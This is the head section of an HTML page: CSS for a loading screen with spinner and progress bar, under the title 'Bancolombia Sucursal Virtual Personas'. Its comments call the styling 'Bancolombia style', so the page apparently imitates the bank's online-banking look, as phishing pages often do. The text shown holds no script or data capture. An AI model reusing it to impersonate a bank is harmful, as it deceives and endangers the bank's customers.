<!DOCTYPE html>
<html lang="es-CO">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  html, body {
    height: 100%;
    width: 100%;
    font-family: 'Open Sans', Arial, sans-serif;
    background: #f9f9fa;
  }
  body {
    display: flex;
    flex-direction: column;
    justify-content: center;
    align-items: center;
    min-height: 100vh;
    transition: opacity 0.6s ease;
  }
  body.fade-out {
    opacity: 0;
  }

  /* Contenedor principal del loader */
  .loader-container {
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    text-align: center;
    animation: fadeIn 0.4s ease;
  }

  @keyframes fadeIn {
    from { opacity: 0; transform: translateY(10px); }
    to { opacity: 1; transform: translateY(0); }
  }

  /* Logo Bancolombia */
  .loader-logo {
    margin-bottom: 32px;
  }
  .loader-logo svg {
    width: 184px;
    height: auto;
  }

  /* Spinner circular estilo Bancolombia */
  .loader-spinner {
    width: 48px;
    height: 48px;
    border: 4px solid #e8e8e8;
    border-top-color: #fdda24;
    border-radius: 50%;
    animation: spin 0.7s linear infinite;
    margin-bottom: 24px;
  }

  @keyframes spin {
    to { transform: rotate(360deg); }
  }

  /* Texto de carga */
  .loader-text {
    font-family: 'Open Sans', Arial, sans-serif;
    font-weight: 400;
    font-size: 14px;
    line-height: 20px;
    color: #5f5d5c;
    margin-bottom: 24px;
  }

  /* Barra de progreso */
  .loader-progress-bar {
    width: 200px;
    height: 4px;
    background: #e8e8e8;
    border-radius: 2px;
    overflow: hidden;
  }
  .loader-progress-fill {
    height: 100%;
    width: 0%;
    background: #fdda24;
    border-radius: 2px;
    transition: width 0.3s linear;
  }

  /* Versión del sistema */
  .loader-version {
    position: fixed;
    bottom: 24px;
    font-family: 'Open Sans', Arial, sans-serif;
    font-weight: 400;
    font-size: 12px;
    color: #b0aeae;
    text-align: center;
  }

  @media (max-width: 575px) {
    .loader-logo svg { width: 150px; }
  }
</style>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700&display=swap" rel="stylesheet">
<title>Bancolombia Sucursal Virtual Personas</title>
</head>
